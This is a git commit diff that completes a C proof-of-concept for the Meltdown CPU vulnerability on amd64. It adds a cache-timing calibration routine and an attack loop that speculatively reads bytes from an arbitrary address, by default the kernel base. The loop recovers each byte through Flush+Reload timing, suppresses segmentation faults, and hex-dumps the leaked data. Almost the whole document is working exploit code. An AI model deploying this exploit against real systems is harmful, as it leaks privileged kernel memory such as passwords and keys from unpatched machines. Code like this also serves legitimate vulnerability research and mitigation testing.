04f38b955909ab5ca0ddf30dd4a453722399d663
Dag-Erling Smørgrav <des@des.no>
2018-01-09 11:58:48 +0000

    Complete implementation for amd64.

--- meltdown.c
+++ meltdown.c
@@ -36,10 +36,15 @@
 
 #include <err.h>
 #include <limits.h>
+#include <setjmp.h>
+#include <signal.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
+
+#define SHIFT	12
 
 /*
  * Assembler functions
@@ -48,7 +53,8 @@ void clflush(const void *addr);
 void rflush(const void *addr, size_t n, size_t step);
 uint64_t rdtsc64(void);
 uint32_t rdtsc32(void);
-uint64_t timeread(const void *);
+uint64_t timed_read(const void *);
+void spec_read(const uint8_t *addr, const uint8_t *probe, unsigned int shift);
 
 /*
  * Kernel base address for a few platforms
@@ -64,29 +70,40 @@ uint64_t timeread(const void *);
 /*
  * Address and length of data to read
  */
-static uintptr_t addr;
+static uint8_t *addr;
 static size_t len;
-#define DEFAULT_ADDR	KERNBASE
+#define DEFAULT_ADDR	((uint8_t *)KERNBASE)
 #define DEFAULT_LEN	16
 
 /*
  * Probe array
  */
-static uint8_t probe[256 * 4096];
+static uint8_t probe[256 * (1 << SHIFT)];
 
 /*
- * Threshold between presumed hot and presumed cold reads
+ * Average measured read latency with cold and hot cache
+ */
+static uint64_t avg_cold;
+static uint64_t avg_hot;
+
+/*
+ * Decision threshold
  */
 static uint64_t threshold;
 
 /*
- * Compute the average hot and cold read latency and derive the threshold.
+ * Self-test
+ */
+static uint8_t selftest[4096];
+
+/*
+ * Compute the average hot and cold read latency and derive the decision
+ * threshold.
  */
 #define N 1048576
 static void
 calibrate(void)
 {
-	uint64_t avg_cold, avg_hot;
 	uint64_t meas, min, max, sum;
 
 	warnx("calibrating...");
@@ -97,7 +114,7 @@ calibrate(void)
 	sum = 0;
 	for (unsigned int i = 0; i < N + 2; ++i) {
 		clflush(&probe);
-		meas = timeread(&probe);
+		meas = timed_read(&probe);
 		if (meas < min)
 			min = meas;
 		if (meas > max)
@@ -110,12 +127,12 @@ calibrate(void)
 	warnx("average cold read: %llu", (unsigned long long)avg_cold);
 
 	/* compute average latency of "hot" access */
-	meas = timeread(&probe);
+	meas = timed_read(&probe);
 	min = UINT64_MAX;
 	max = 0;
 	sum = 0;
 	for (unsigned int i = 0; i < N + 2; ++i) {
-		meas = timeread(&probe);
+		meas = timed_read(&probe);
 		if (meas < min)
 			min = meas;
 		if (meas > max)
@@ -127,9 +144,91 @@ calibrate(void)
 	avg_hot = sum / N;
 	warnx("average hot read: %llu", (unsigned long long)avg_hot);
 
-	/* set threshold to the average of the two */
+	/* set decision threshold to the average of the two */
 	threshold = (avg_hot + avg_cold) / 2;
 	warnx("threshold: %llu", (unsigned long long)threshold);
+
+	/* warn if the numbers are very close */
+	if ((avg_hot - avg_cold) * 10 < threshold)
+		warnx("warning: low delta between cold and hot read latency!");
+}
+
+/*
+ * Print a pretty hex dump of the specified buffer.
+ */
+static void
+hexdump(const void *base, const uint8_t *buf, size_t len)
+{
+	unsigned int i;
+	ssize_t res;
+
+	res = len;
+	while (res > 0) {
+		printf("%p |", base);
+		for (i = 0; i < 16; ++i) {
+			if (i == 8)
+				printf(" :");
+			if (i < res)
+				printf(" %02x", buf[i]);
+			else
+				printf(" --");
+		}
+		printf(" | ");
+		for (i = 0; i < 16; ++i) {
+			if (i == 8)
+				printf(" : ");
+			if (i < res)
+				printf("%c", (buf[i] >= ' ' && buf[i] <= '~') ? buf[i] : '.');
+			else
+				printf("-");
+		}
+		printf(" |\n");
+		res -= 16;
+		buf += 16;
+	}
+}
+
+/*
+ * Perform the Meltdown attack.
+ *
+ * For each byte in the specified range:
+ * - Flush the cache.
+ * - Read the given byte, then touch a specific probe address based on its
+ *   value of the byte that was read.
+ * - Measure the time it takes to access each probe address.
+ * - In theory, one of the probe addresses should be in cache, while the
+ *   others should not.  This indicates the value of the byte that was
+ *   read.
+ */
+static sigjmp_buf jmpenv;
+static void sighandler(int signo) { siglongjmp(jmpenv, signo); }
+static void
+meltdown(void)
+{
+	uint8_t line[16];
+	sig_t sigsegv;
+	unsigned int i, j;
+	int signo;
+
+	sigsegv = signal(SIGSEGV, sighandler);
+	for (i = 0; i < len; ++i) {
+		line[i % 16] = 0;
+		rflush(probe, 256, 1 << SHIFT);
+		if ((signo = sigsetjmp(jmpenv, 1)) == 0)
+			spec_read(&addr[i], probe, SHIFT);
+		for (j = 0; j < 256; ++j) {
+			uint64_t delta = timed_read(&probe[j << SHIFT]);
+			if (delta < threshold) {
+				line[i % 16] = j;
+				break;
+			}
+		}
+		if (i % 16 == 15)
+			hexdump(addr + i - 15, line, 16);
+	}
+	if (i % 16 > 0)
+		hexdump(addr + i - i % 16, line, i % 16);
+	signal(SIGSEGV, sigsegv);
 }
 
 /*
@@ -150,7 +249,7 @@ main(int argc, char *argv[])
 	char *end;
 	int opt;
 
-	while ((opt = getopt(argc, argv, "a:n:")) != -1)
+	while ((opt = getopt(argc, argv, "a:n:s")) != -1)
 		switch (opt) {
 		case 'a':
 			if (addr != 0)
@@ -158,7 +257,7 @@ main(int argc, char *argv[])
 			umax = strtoull(optarg, &end, 16);
 			if (end == optarg || *end != '\0')
 				errx(1, "invalid address");
-			addr = umax;
+			addr = (uint8_t *)umax;
 			if ((uintmax_t)addr != umax)
 				errx(1, "address is out of range");
 			break;
@@ -171,6 +270,12 @@ main(int argc, char *argv[])
 			len = umax;
 			if (len == 0 || (uintmax_t)len != umax)
 				errx(1, "length is out of range");
+			break;
+		case 's':
+			if (addr != 0 || len != 0)
+				usage();
+			addr = selftest;
+			len = 510;
 			break;
 		default:
 			usage();
@@ -187,10 +292,18 @@ main(int argc, char *argv[])
 		addr = DEFAULT_ADDR;
 	if (len == 0)
 		len = DEFAULT_LEN;
+	if (addr == selftest)
+		for (unsigned int i = 0; i < sizeof selftest; ++i)
+			selftest[i] = ~(uint8_t)(i % 255);
 
-	warnx("Attempting to read %zu bytes from %p", len, (void *)addr);
+	/* ensure that the probe array is paged in */
+	memset(probe, 0xff, sizeof probe);
 
+	/* calibrate our timer */
 	calibrate();
+
+	/* perform the attack */
+	meltdown();
 
 	exit(0);
 }
